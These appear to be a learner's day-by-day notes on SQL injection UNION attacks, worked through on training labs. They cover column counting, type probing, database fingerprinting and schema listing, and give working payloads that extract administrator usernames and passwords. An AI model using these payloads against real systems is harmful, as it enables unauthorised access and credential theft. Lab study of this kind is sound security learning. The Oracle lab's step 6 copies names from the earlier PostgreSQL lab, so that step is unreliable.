SQL injection UNION Attacks:

When an application is vulnerable to SQl injection , and the results of the query are returned within the application's
responses, we can use the UNION keyword to retrieve data from other tables within the database.
This is commonly known as SQL injection UNION attack.

For a union query to work , two key requirements must be met:
->The individual quries must return the same number of colums.
->The data typees in each column must be compatible between the individual queries.

To met the SQL injection UNION Attack , This conditions need to find out
->How many colums are being retuned from the original query
->which colums returned from the original query are of a suitable data type to hold the results from the 
  injected queries.

** Determining the number of colums required **
When we perfom a SQL injection UNION attack, there are two effective methos to determine how many colums are
being returned from the original query.
-- Method ONE --
  incrementing the specific column index until an error occurs (ORDER By)
  EX: 'ORDER BY 1--
      'ORDER BY 2--
      'ORDER BY 3-- 
    Error -> if we exceeds the number of rows 

-- Method TWO --
   The second method involves submitting a series of UNION SELECT paylods specifying a different number of null values
   EX :' UNION SELECT NULL --
       ' UNION SELECT NULL,NULL --
       ' UNION SELECT NULL,NULL,NULL --
    Error -> if it's doesn't match to no of rows

--------------------------------------------------------------------------------------------------------------- 
1.Lab: SQL injection UNION attack, determining the number of columns returned by the query

This lab contains a SQL injection in the product category filter .

UNION :It is used to reteive one more table from the existing SQL Query.


End Goad: To solve the lab, determine the number of columns returned by the query by 
performing a SQL injection UNION attack that returns an additional row containing null values.

We can solve this by entering the following commands :
 ' UNION SELECT NULL,NULL,NULL --

--------------------------------------------------------------------------------------------------------
This is day3 :

We will continue the full attack chain for the UNION Based attacks so far we have found the no of
colums returned.

Rest we will continue in this day and we are going to solve more numbers of labs, I hope i will enjoy
these lab and try to have fun :)

Step1 : Dertimine the no of colums -> done in previous day
Step2 : Determine the datatype of the colums -> will do today

Query :
SELECT a,b,c from table UNION SELECT 'a' ,NULL,NULL --
Actual query is : ' UNION SELECT 'a',NULL,NULL --
Error -> The colum is not string type
No Error -> The colum is string type
-------------------------------------------------------------------------------------------------------
Lab: SQL injection UNION attack, finding a column containing text

This lab contains a SQL vlunerability in the product category filter.

END Goal is to return the random value that need to make appear within the query results.

Query used to solve the lab is 'UNION SELECT NULL,'Bw387D',NULL

Here we need to first determine the no of coloums and need to find the datatype of that coloums
till here we have completed the attack pattern

-------------------------------------------------------------------------------------------------------
Lab: SQL injection UNION attack, retrieving data from other tables

This lab contains SWL injection vlunerabiltiy in the product category filter.
The database contains a different table called users, with coumns called username and password.

END Goadl: Perform a SQL injection UNION attack that retireves all usernmes and passwords and using that
infomation need to log in as the administrator user.

Query used: category=Gifts'UNION+select+username,password+from+users--

Username: administrator
Password: xve3icz3raaq5r2pyvkf
--------------------------------------------------------------------------------------------------------------
In the above examples we retrieved the username ad password in two different columns , now we will see how to retrieve the multiple values within a single column
' UNION SELECT username || '~' || password FROM users--

The double-pipe sequence || which is a string concatenation operator on oracle. The injected query concatenates together the values of the username and password fields separated by the ~ character 

------------------------------------------------------------------------------------------------------------
Lab: SQL injection UNION attack, retrieving multiple values in a single column
The lab consist as SQL injection vulnerabilities in the product category filter.

The database contains a different table called users, with columns called username and password.

END Goad: To solve the lab , perform a SQL injection UNION attack that retrieves all username and passwords, and use the information to log in as the administrator user
Actual query used to solve this lab:
category=Pets' UNION SELECT NULL,username||'~'||password from users--
Output:
administrator~hrunyore2h97l8vixtgl

-------------------------------------------------------------------------------------------------------------
Examining the database in SQL injection attacks
To exploit SQL injection vulnerabilities, its often necessary to find information about the database this include
*The type and version of the database software
*The tables and columns that the database contains

Querying the database type and version
The following are some queries to determine the database version 
* Microsoft,MySQL -> SELECT @@version
* Oracle  ->  SELECT banner FROM v$version
              SELECT version from v$instance
* postgrel -> SELECT version()

Example:
' UNION SELECT @@version --

NOTE:
And unfounately ORACLE Database require the from clause every time we use SELECT Statement 
so for the oracle databases we have to use something like this 
' UNION SELECT NULL,NULL from dual  
The dual is the dummy database which consist of single table with the content dummy can be used by all the users

---------------------------------------------------------------------------------------------------------------
Lab: SQL injection attack, querying the database type and version on Oracle

The lab contains a SQL injection vlunerability in the product category filter.

NOTE:
And unfounately ORACLE Database require the from clause every time we use SELECT Statement 
so for the oracle databases we have to use something like this 
' UNION SELECT NULL,NULL from dual  
The dual is the dummy database which consist of single table with the content dummy can be used by all the users

END Goal : Need to display the database version string.d
The actual query used to solve the lab is something like this 
'UNION SELECT NULL,banner from v$version --

--------------------------------------------------------------------------------------------------------------
Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
The lab contains a SQL injection vlunerability in the product category filter,

END Goal : Need to display the database version string.
Exact query used to solve this lab is
category=Pets'union+select+NUll,%40%40version+%23+ (url encoded)
category=pets' UNION Select NULL,@@version #

---------------------------------------------------------------------------------------------------------------
Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query information_schema.tables to list the tables in the database: 
SELECT * FROM information_schema.tables
This returns output like the following
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE

This output indicates that there are three tables, called Products, Users, and Feedback.

You can then query information_schema.columns to list the columns in individual tables:
SELECT * FROM information_schema.columns WHERE table_name = 'Users'

This returns output like the following:
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar

This output shows the columns in the specified table and the data type of each column. 
---------------------------------------------------------------------------------------------------------------
Lab: SQL injection attack, listing the database contents on non-Oracle databases

The lab contains a SQL injection vlunerability in the product category filter

END Goal :
The application has a login function, and the database contains a table that holds usernames and passwords.
Need to determine the name of this table and the columns it contains, then retieve the contents of the table and using that need to log in as the administrator user

STEPS TO DO:
Step 1 : Find the no of columns
       ' Order by 2 --
        We have 2 coloums

Step 2 : Find the datatypes of column
         ' UNION SELECT NULL,NULL--
         ' UNION SELECT 'a','a' --
          Both colums of string datatype

Step 3 : Find the Type of database and version
        'UNION SELECT NULL,@@version -- -> gives error
        'UNION SELECT NULL,banner from dual -- -> gives error
        'UNION SELECT NULL,version () -- -> NO Error
        The data is the postgreSQL 

Step 4 : List all the tables from the database 
        'UNION SELECT NULL,table_name FROM information_schema.tables
        This will list the all the tables from the database -> users_sdogyp

Step 5 : list all the columns name from the retrived table 
         'UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name = 'users_sdogyp'
         username_dvdqwj
         password_iubgwt

Step 6 : Output username and password 
        'union select username_dvdqwj,password_iubgwt from users_sdogyp --
         administrator
         73m7h8b0kp823olbzf22

Step 7 : Login using these credentials

Finally we have logged in as ADMIN !! 

------------------------------------------------------------------------------------------------------------

For the listing he contents of an oracle database

You can list tables by querying all_tables:
SELECT * FROM all_tables

You can list columns by querying all_tab_columns:
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'

--------------------------------------------------------------------------------------------------------------

Lab: SQL injection attack, listing the database contents on Oracle

This lab contains a SQL injection vlunerability in the product category filter 

The application has a login function, and the database contains a talbe that holds username and passwords , we need to determine the nme of this table and the columns it contains, then retieve the contents of the table to obtain the username and password of all users.
END Goal:
To solve the lab , log in as the administrator user

Again to solve this lab we need to follow the 7 Step 


Step 1 : Find the no of columns
       ' Order by 2 --
        We have 2 coloums

Step 2 : Find the datatypes of column
         ' UNION SELECT NULL,NULL--
         ' UNION SELECT 'a','a' --
          Both colums of string datatype

Step 3 : Find the Type of database and version
        'UNION SELECT NULL,@@version -- -> gives error
        'UNION SELECT NULL,banner from dual -- -> NO Error
        'UNION SELECT NULL,version () -- -> gives error
        The data is the OracleDB 

Step 4 : List all the tables from the database 
        'UNION SELECT NULL,TABLE_NAME FROM all_tables
        This will list the all the tables from the database -> USERS_RXEZYU

Step 5 : list all the columns name from the retrived table 
         'UNION SELECT NULL,COLUMN_NAME FROM all_tab_columns Where table_name='USERS_RXEZYU'--
         USERNAME_GWPOPR
         PASSWORD_YEDOPX

Step 6 : Output username and password 
        'union select username_dvdqwj,password_iubgwt from users_sdogyp --
         administrator
         u0izo71vyry7if8cibit

Step 7 : Login using these credentials

Finally we have logged in as ADMIN !! 

------------------------------------DAY ENDED AT NEXT MORNING 1:00--------------------------------------

I had a lot of fun of solving this labs and i have learnt valuable lesson that too hands on !!

i eargly waiting for tommorrow to solve more labs :)









